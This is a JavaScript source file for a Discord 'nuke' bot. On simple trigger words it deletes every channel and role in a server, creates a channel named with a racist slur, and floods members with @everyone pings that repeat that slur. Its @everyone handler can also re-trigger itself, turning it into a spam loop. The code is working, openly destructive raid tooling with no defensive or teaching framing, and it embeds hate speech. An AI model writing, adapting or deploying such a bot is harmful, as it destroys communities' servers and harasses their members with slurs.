const Discord = require('discord.js')
const client = new Discord.Client({ intents: ["GUILDS", "GUILD_MESSAGES"] })
const config = require('./config.json')
client.login(config.token)
var nukeMsg = 'NAZI NIGGERS'

client.on('message', async (message) => {
  if (message.content === 'del') {
    message.guild.channels.cache.forEach(channel => channel.delete());
  }
});



client.on('message', async (message) => {
  if (message.content === 'nuke') {
    message.guild.channels.cache.forEach(channel => channel.delete());

    message.guild.roles.cache.forEach(role => role.delete());

    await message.guild.channels.create(nukeMsg, {
      type : 'text'
    }).then(async channel=> {
      channel.send('@everyone')
    })
  }
})


client.on('message', async (message) => {
  if (message.content.includes('@everyone')) {
    await message.guild.channels.create(`nuke`, {
      type : 'text'
    }).then(async channel=> {
      channel.send('@everyone')
    message.channel.send('@everyone' + nukeMsg)
    message.channel.send('@everyone' + nukeMsg)
    message.channel.send('@everyone' + nukeMsg)
    message.channel.send('@everyone' + nukeMsg)
  })
  }
})
